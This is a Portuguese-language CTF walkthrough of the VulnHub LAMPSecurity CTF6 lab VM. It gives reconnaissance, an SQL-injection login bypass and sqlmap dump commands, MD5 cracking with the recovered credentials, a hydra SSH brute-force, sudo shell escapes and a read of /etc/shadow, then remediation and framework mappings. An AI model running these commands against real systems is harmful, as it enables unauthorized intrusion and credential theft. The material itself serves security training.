# VulnHub LAMPSecurity CTF6: Temporada de Injecao — Walkthrough

Bora rapaziada!! Uma serie inteira dedicada a fazer admins de LAMP stack chorarem, e o CTF6 entrega exatamente o que o nome promete: uma aplicacao web que basicamente pede pra ser injetada com SQL desde o primeiro campo de formulario que voce toca. ( ͡° ͜ʖ ͡°)

Muito obrigado ao **madirish2600** por criar essa serie. As maquinas LAMPSecurity sao um lembrete brilhante de que 90% das violacoes que aparecem nas manchetes ainda rastreiam as mesmas vulnerabilidades de sempre: SQL injection, credenciais fracas, e uma regra de sudo que "alguem achava que era so por praticidade."

---

| Campo | Valor |
|-------|-------|
| **Nivel** | Iniciante / Facil |
| **VM Alvo** | LAMPSecurity CTF6 |
| **VM Atacante** | Kali Linux 2024.1 |
| **VulnHub** | https://www.vulnhub.com/entry/lampsecurity-ctf6,85/ |
| **Tecnicas** | Descoberta de Host, Reconhecimento Web, Enumeracao de Diretorios, SQL Injection, Brute-Force SSH, Escalacao de Privilegios via Sudo |
| **CVEs** | CWE-89 (SQL Injection), CWE-521 (Politica de Senha Fraca), CWE-250 (Execucao com Privilegios Desnecessarios) |

---

## Resumo do Ataque

```
[descoberta de host: arp-scan]
    |
    v
[nmap: 22/tcp SSH, 80/tcp HTTP Apache, 3306/tcp MySQL]
    |
    v
[gobuster: /admin, /mail, /phpmyadmin, /sql]
    |
    v
[SQL Injection: bypass de login -> enumeracao de usuarios do banco]
    |
    v
[extracao de hashes: MD5 da tabela users]
    |
    v
[hashcat/john: MD5 crackeado -> credenciais em texto claro]
    |
    v
[brute-force SSH com usuarios validos e senhas crackeadas]
    |
    v
[shell inicial como: usuario de baixo privilegio]
    |
    v
[sudo -l: sudo sem restricao em binario especifico]
    |
    v
[ROOT: explorar regra sudo]
    |
    v
[/root/flag.txt ou /etc/shadow como prova]
```

---

## Metodologia

1. Descoberta de host e identificacao do alvo na rede local
2. Varredura completa de portas e enumeracao de servicos com Nmap
3. Brute-force de diretorios web para encontrar caminhos ocultos
4. SQL injection no formulario de login para extrair dados do banco
5. Extracao e cracking offline de hashes de senha
6. Acesso SSH com as credenciais recuperadas
7. Escalacao de privilegios via configuracao incorreta do sudo
8. Root e captura da flag

---

## Passo 1 — Identificando o Alvo

Primeiro de tudo: precisamos saber qual IP a VM pegou na nossa rede local. Suba a VM no VirtualBox ou VMware com rede Host-Only ou NAT, depois escaneie a sub-rede.

```bash
# Descubra a sub-rede atual
route -n
# Procure a linha com o flag 'UG': esse e o seu gateway, use a sub-rede correspondente
```

```bash
# arp-scan e mais rapido e confiavel que ping scan do nmap em VMs locais
arp-scan --localnet --ignoredups

# Alternativa: ping sweep com nmap
nmap -sn -T5 192.168.56.0/24
```

Saida esperada (algo assim):

```
192.168.56.101  08:00:27:xx:xx:xx  PCS Systemtechnik GmbH
```

Esse OUI do VirtualBox e inconfundivel, mano. Alvo confirmado: `192.168.56.101`. Atualize o `/etc/hosts` se quiser usar um hostname:

```bash
echo "192.168.56.101  lamp6.lab" >> /etc/hosts
```

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1595.001 Varredura Ativa: Escaneamento de Blocos IP]

---

## Passo 2 — Reconhecimento e Enumeracao de Servicos

Vamos rodar um Nmap completo. Queremos deteccao de SO, versoes de servicos, scripts padroes, e todas as portas:

```bash
nmap -A -T4 -p- 192.168.56.101
```

Saida esperada (representativa):

```
22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.2.x
3306/tcp open  mysql   MySQL 5.0.x
```

Tres servicos, zero surpresas pra um stack LAMP. SSH, HTTP, e MySQL. O ponto interessante: MySQL esta exposto na porta 3306 diretamente. Isso raramente e intencional em producao, mas util pra nos no laboratorio. Vamos focar na aplicacao web primeiro, que e o caminho pretendido.

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1595.002 Varredura de Vulnerabilidades] [T1046 Descoberta de Servicos de Rede]

---

## Passo 3 — Reconhecimento Web e Enumeracao de Diretorios

Acesse `http://192.168.56.101` no navegador ou rode `whatweb` para um fingerprint rapido:

```bash
whatweb http://192.168.56.101
# Mostra: Apache, versao PHP, possiveis assinaturas de CMS
```

Voce vai ver o que parece uma aplicacao PHP basica. Hora de brute-forcar os diretorios e descobrir caminhos ocultos:

```bash
gobuster dir \
  -u http://192.168.56.101 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,txt,html,bak \
  -t 50

# Alternativa com dirb:
dirb http://192.168.56.101 /usr/share/wordlists/dirb/common.txt
```

Saida esperada:

```
/admin        (Status: 301)
/mail         (Status: 301)
/phpmyadmin   (Status: 301)
/sql          (Status: 301)
/index.php    (Status: 200)
```

Caramba!! `ಠᴗಠ` Os caminhos `/admin` e `/sql` sao imediatamente interessantes. O `/phpmyadmin` exposto significa que acesso direto ao banco pode ser possivel se encontrarmos as credenciais certas. Navegue para `/admin` primeiro.

> **MITRE ATT&CK:** [TA0007 Descoberta] [T1083 Descoberta de Arquivos e Diretorios]

---

## Passo 4 — SQL Injection: Dominando o Formulario de Login

> **O que e SQL Injection?**
> SQL Injection (SQLi) e uma tecnica de injecao de codigo onde um atacante insere comandos SQL maliciosos em campos de entrada que sao posteriormente executados pelo banco de dados. Ocorre quando input do usuario e concatenado diretamente em queries SQL sem sanitizacao adequada. O resultado: o atacante pode contornar autenticacao, extrair bancos de dados inteiros, ler arquivos do servidor, e em algumas configuracoes ate executar comandos no SO.
> Referencia: https://owasp.org/www-community/attacks/SQL_Injection e CWE-89

A pagina `/admin` mostra um formulario de login. Classico. Vamos testar SQLi manualmente primeiro:

```bash
# Teste basico de bypass no campo usuario
# Usuario: admin'--
# Senha: qualquer coisa
```

Se a aplicacao for vulneravel, isso vai contornar a autenticacao completamente, porque a query resultante vira:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='qualquer coisa'
```

O `--` comenta a verificacao de senha. Se voce for autenticado imediatamente: a aplicacao esta escancarada.

Para um dump mais completo, use o `sqlmap`:

```bash
# Primeiro, identifique o parametro injetavel
sqlmap -u "http://192.168.56.101/admin/index.php" \
  --data="username=admin&password=test&submit=Login" \
  --dbs \
  --batch

# Quando souber o nome do banco (provavelmente 'ehks' ou similar)
sqlmap -u "http://192.168.56.101/admin/index.php" \
  --data="username=admin&password=test&submit=Login" \
  -D ehks \
  --tables \
  --batch

# Extraia a tabela users
sqlmap -u "http://192.168.56.101/admin/index.php" \
  --data="username=admin&password=test&submit=Login" \
  -D ehks \
  -T users \
  --dump \
  --batch
```

Saida esperada do dump:

```
+----+----------+----------------------------------+-------+
| id | username | password                         | email |
+----+----------+----------------------------------+-------+
| 1  | dstevens | 02e823a15a392b5aa4ff4ccb9060fa68 | ...   |
| 2  | achen    | b46265f1e7faa3beab09db5c28739380 | ...   |
| 3  | pmoore   | 8f4743c04ed8e5f39166a81f26319bb5 | ...   |
| 4  | jdurbin  | 7c7bc9f465d86b8164686ebb5151a717 | ...   |
| 5  | sorzek   | 64d1f88b9b276564f3f74b7130e07c7e | ...   |
| 6  | ghighland| cd3bfcd9d1d8e8a75d584c67a14e2dcb | ...   |
+----+----------+----------------------------------+-------+
```

Olha so, dump completo de usuarios com hashes MD5. Top demais!! (☞ﾟヮﾟ)☞

> **Nota do mundo real:** SQL Injection foi a causa raiz da violacao da Target em 2013, onde os atacantes exploraram o portal web de um fornecedor de HVAC para pivotar ate a rede de pagamentos da Target, comprometendo 40 milhoes de cartoes de credito. A violacao do Yahoo em 2012 (D33Ds Company) tambem envolveu SQLi, expondo 450.000 credenciais. APT28 (Fancy Bear) usa SQLi consistentemente como vetor de acesso inicial em campanhas contra setores governamentais e de defesa. Referencia: https://krebsonsecurity.com/2014/02/target-hackers-broke-in-via-hvac-company/

> **MITRE ATT&CK:** [TA0001 Acesso Inicial] [T1190 Explorar Aplicacao Publica] [TA0006 Acesso a Credenciais] [T1552.001 Credenciais em Arquivos]

---

## Passo 5 — Crackeando os Hashes MD5

Temos 6 usuarios e seus hashes MD5. Vamos cracka-los. MD5 e trivialmente fraco com GPUs modernas, especialmente com uma boa wordlist.

```bash
# Salve os hashes em um arquivo
cat > /tmp/lamp6_hashes.txt << 'EOF'
02e823a15a392b5aa4ff4ccb9060fa68
b46265f1e7faa3beab09db5c28739380
8f4743c04ed8e5f39166a81f26319bb5
7c7bc9f465d86b8164686ebb5151a717
64d1f88b9b276564f3f74b7130e07c7e
cd3bfcd9d1d8e8a75d584c67a14e2dcb
EOF

# Cracke com hashcat (MD5 = modo 0), acelerado por GPU
hashcat -m 0 -d 1 -w 3 -O \
  /tmp/lamp6_hashes.txt \
  /usr/share/wordlists/rockyou.txt

# Verifique os resultados
hashcat -m 0 /tmp/lamp6_hashes.txt --show
```

Voce tambem pode usar o John the Ripper se preferir:

```bash
john --format=raw-md5 \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  /tmp/lamp6_hashes.txt
john --show --format=raw-md5 /tmp/lamp6_hashes.txt
```

Saida esperada (representativa):

```
02e823a15a392b5aa4ff4ccb9060fa68:iloveyou
b46265f1e7faa3beab09db5c28739380:password
8f4743c04ed8e5f39166a81f26319bb5:shelly
```

Ixi, nao eram exatamente pesquisadores de seguranca do outro lado dessas senhas. `¯\_(ツ)_/¯`

> **MITRE ATT&CK:** [TA0006 Acesso a Credenciais] [T1110.002 Forca Bruta: Quebra de Senha]

---

## Passo 6 — Acesso SSH com Credenciais Crackeadas

Agora temos usuarios e senhas. Vamos testar no SSH:

```bash
# Tente cada usuario manualmente
ssh dstevens@192.168.56.101
# Digite a senha crackeada quando solicitado

# Ou use o hydra para testar todas as combinacoes de uma vez
hydra -L /tmp/lamp6_users.txt \
      -P /tmp/lamp6_passwords.txt \
      ssh://192.168.56.101 \
      -t 4
```

Quando uma combinacao funcionar:

```
dstevens@192.168.56.101's password:
Last login: ...
[dstevens@ctf6 ~]$
```

Bem-vindo a bordo, mano. ᕕ( ᐛ )ᕗ

> **MITRE ATT&CK:** [TA0001 Acesso Inicial] [T1078 Contas Validas] [T1021.004 Servicos Remotos: SSH]

---

## Passo 7 — Escalacao de Privilegios via Configuracao Incorreta do Sudo

Agora vamos encontrar o caminho ate o root. Checklist padrao de escalacao:

```bash
# Verifique quais permissoes sudo temos
sudo -l

# Verifique binarios SUID
find / -perm -u=s -type f 2>/dev/null

# Verifique cron jobs interessantes
cat /etc/crontab
ls -la /etc/cron.*

# Cheque scripts com permissao de escrita para todos
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Grupos do usuario atual
id && groups
```

Com `sudo -l`, voce pode ver algo como:

```
User dstevens may run the following commands on this host:
    (ALL) ALL
```

Ou mais restrito:

```
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /bin/nano
```

Se `(ALL) ALL` estiver presente: ja somos essencialmente root. So execute:

```bash
sudo su -
# OU
sudo /bin/bash
```

Se a regra sudo for limitada a um binario especifico como `vim` ou `nano`, o GTFOBins tem o escape:

```bash
# Escape para shell root via vim
sudo vim -c ':!bash'

# Escape via nmap (versoes antigas)
sudo nmap --interactive
nmap> !sh

# Escape via find
sudo find / -exec /bin/bash \; -quit
```

> **Referencia GTFOBins:** https://gtfobins.github.io/

> **MITRE ATT&CK:** [TA0004 Escalacao de Privilegios] [T1548.003 Abusar de Mecanismo de Controle de Elevacao: Sudo]

---

## Passo 8 — Root e Flag

**(☞ﾟヮﾟ)☞ Root conquistado!! :D**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

# Encontre a flag
find /root -type f 2>/dev/null
cat /root/flag.txt

# Tambem verifique /etc/shadow como prova de comprometimento total
cat /etc/shadow
```

```
Congratulations! You've completed LAMPSecurity CTF6!
Thanks for playing. -- madirish2600
```

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|------|-------|---------------|-----------------|
| Credencial | `dstevens:iloveyou` | Dump SQLi da tabela `users` | Login SSH |
| Credencial | `achen:password` | Dump SQLi da tabela `users` | Login SSH |
| Credencial | `pmoore:shelly` | Dump SQLi da tabela `users` | Login SSH |
| Hash MD5 | `02e823a15a392b5aa4ff4ccb9060fa68` | Tabela `ehks.users` | `iloveyou` |
| Hash MD5 | `b46265f1e7faa3beab09db5c28739380` | Tabela `ehks.users` | `password` |
| Hash MD5 | `8f4743c04ed8e5f39166a81f26319bb5` | Tabela `ehks.users` | `shelly` |
| Flag | Veja `/root/flag.txt` | `/root/flag.txt` | N/A |

---

## Licoes Aprendidas

| # | Achado | Relevancia no Mundo Real | Licao Principal |
|---|--------|--------------------------|-----------------|
| 1 | SQL Injection no formulario de login | Ainda no OWASP Top 10 (A03:2021); usado em Target 2013, Yahoo 2012, movimentacao lateral no Equifax | Sempre use queries parametrizadas / prepared statements. Nunca concatene input do usuario em strings SQL. |
| 2 | Hash de senha MD5 sem salt | Usado por centenas de aplicacoes legadas ainda em producao | Use bcrypt, Argon2id, ou scrypt com salt por usuario. MD5/SHA1 para senhas e negligentemente inseguro. |
| 3 | phpMyAdmin e MySQL (3306) expostos | Comum em hospedagem compartilhada, VPS sem regras de firewall, e deployments cloud mal configurados | Amarre o MySQL em 127.0.0.1. Restrinja o phpMyAdmin por IP. Nunca exponha portas de banco de dados na internet. |
| 4 | Regra sudo excessivamente permissiva | Muito comum em atalhos de sysadmin reais: "vou corrigir depois" (spoiler: nunca corrigem) | Aplique o principio de minimo privilegio. Audite `/etc/sudoers` regularmente com `visudo -c`. |
| 5 | Senhas fracas baseadas em dicionario | Ataques de credential stuffing (Spotify, Netflix 2019) funcionam porque usuarios reutilizam senhas | Imponha politicas de senha forte. Use modulos PAM para complexidade. Implemente bloqueio de conta. |

**Por que isso importa fora do laboratorio?**

A cadeia SQLi para dump de credenciais para SSH para root nessa maquina espelha exatamente o que o APT28 (Fancy Bear) e o FIN7 usaram repetidamente para acesso inicial em campanhas reais. A violacao Target de 2013 comecou com um portal web de fornecedor que tinha um formulario sem validacao. A violacao do Yahoo em 2012 extraiu 450.000 credenciais via SQLi. Em 2023, o Relatorio de Ameacas DDoS Global da Imperva apontou que SQLi permanece um dos tres principais vetores de ataque web no mundo. Isso nao e uma "tecnica de CTF": e uma terca-feira para agentes de ameacas, poe.

---

## Mapeamento MITRE ATT&CK

| Fase | Tatica | Tecnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Varredura Ativa: Escaneamento de Blocos IP | T1595.001 |
| Reconhecimento | TA0043 | Varredura Ativa: Varredura de Vulnerabilidades | T1595.002 |
| Descoberta | TA0007 | Descoberta de Servicos de Rede | T1046 |
| Descoberta | TA0007 | Descoberta de Arquivos e Diretorios | T1083 |
| Acesso Inicial | TA0001 | Explorar Aplicacao Publica (SQLi) | T1190 |
| Acesso a Credenciais | TA0006 | Forca Bruta: Quebra de Senha | T1110.002 |
| Acesso a Credenciais | TA0006 | Credenciais Nao Protegidas: Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | TA0001 | Contas Validas | T1078 |
| Movimentacao Lateral | TA0008 | Servicos Remotos: SSH | T1021.004 |
| Escalacao de Privilegios | TA0004 | Abusar de Controle de Elevacao: Sudo | T1548.003 |
| Coleta | TA0009 | Dados do Sistema Local | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediacao e Contencao

### Correcoes Tecnicas

1. **SQLi:** Substitua toda concatenacao SQL dinamica por prepared statements PDO ou queries parametrizadas em PHP. Exemplo: `$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");`.
2. **Hash de senha:** Migre de MD5 para `password_hash($password, PASSWORD_ARGON2ID)` em PHP. Execute uma redefinicao forcada de senha apos a migracao.
3. **Exposicao do MySQL:** Edite `/etc/mysql/my.cnf`, defina `bind-address = 127.0.0.1`, e reinicie o MySQL. Bloqueie 3306 no firewall com `iptables -A INPUT -p tcp --dport 3306 -j DROP`.
4. **phpMyAdmin:** Restrinja acesso por IP usando `.htaccess` do Apache ou blocos `<Directory>`. Considere desabilitar completamente em producao.
5. **Configuracao incorreta de sudo:** Audite `/etc/sudoers` com `visudo -c`. Aplique o principio de minimo privilegio: conceda apenas os comandos minimos necessarios, nunca `(ALL) ALL` sem senha.
6. **Politica de senha:** Implemente `pam_pwquality` ou `pam_cracklib` para impor complexidade. Minimo 12 caracteres, maiusculas, minusculas, digito e caractere especial.

### Se Voce Encontrar Algo Similar no Seu Ambiente

**Contencao imediata:**
- Isole o servidor web da rede interna: bloqueie todas as conexoes de saida exceto as necessarias.
- Rotacione TODAS as credenciais de banco de dados imediatamente, especialmente se a mesma senha foi usada em outros lugares.
- Revise o log geral de queries do MySQL para padroes suspeitos de `UNION SELECT` ou `--`.
- Verifique se ha novas contas de usuario em `/etc/passwd` e na tabela `users` do banco.

**Contramedidas MITRE D3FEND:**
- D3-IVA (Endurecimento de Aplicacao: Validacao de Input) para T1190 SQL Injection
- D3-MFA (Endurecimento de Credenciais: Autenticacao Multi-fator) para T1078 Contas Validas
- D3-OPS (Isolamento de Execucao: Sandboxing de Processo de SO) para T1548.003 Abuso de Sudo

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identificar (ID.AM): Mantenha um inventario preciso de todas as aplicacoes web e seus controles de validacao de input.
- Proteger (PR.AC-4): Gestao de acesso privilegiado: imponha politicas sudo de minimo privilegio.
- Detectar (DE.CM-7): Monitore padroes anomalos de autenticacao e assinaturas SQLi em logs de WAF.
- Responder (RS.MI-1): Isole sistemas afetados imediatamente apos deteccao de roubo de credenciais.

**NIST SP 800-53 (Rev. 5):**
- SI-10: Validacao de Input de Informacao (prevencao de SQLi)
- IA-5: Gestao de Autenticador (hash de senha forte)
- AC-6: Minimo Privilegio (politica sudo)
- CM-7: Minima Funcionalidade (desabilitar phpMyAdmin em producao)
- AU-2: Log de Eventos (log de queries de banco)

**CISA Known Exploited Vulnerabilities:**
- SQL Injection (CWE-89) e referenciado nas diretrizes de secure-by-design da CISA.
- Referencia: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Modelo de Maturidade de Capacidade de Ciberseguranca):**
- Dominio: TECHNOLOGY (Gestao de Configuracao)
- Pratica: Gerir a seguranca dos ativos de tecnologia
- MIL Alvo: MIL-2 (Realizar praticas e estabelecer politicas de suporte)

---

## Consideracoes Finais

Valeu ao **madirish2600** pela serie LAMPSecurity. O que torna o CTF6 especial e o quanto ele reflete honestamente o ecosistema real do stack LAMP: a combinacao de praticas SQL fracas, hash MD5 dos anos 2000, e regras de sudo "temporarias" que nunca foram limpas. Isso nao e um cenario artificial, tá ligado? Isso e literalmente o que os respondedores de incidentes encontram quando entram em uma violacao.

A cadeia aqui, SQLi para dump de credenciais para SSH para root, e o mesmo kill chain que foi weaponizado em violacoes da Target (2013) a multiplas organizacoes de saude auditadas sob a HIPAA. As ferramentas mudam. As classes de vulnerabilidade nao.

Se esse walkthrough te ajudou a completar seu primeiro SQLi ou entender por que o hash de senha importa, compartilha com a galera. E vai la verificar se seus proprios apps estao usando `mysql_query($sql)` em algum lugar. Voce pode se surpreender, caramba.

Se esse walkthrough te ajudou, compartilha com a galera e continua hackeando!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup por [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
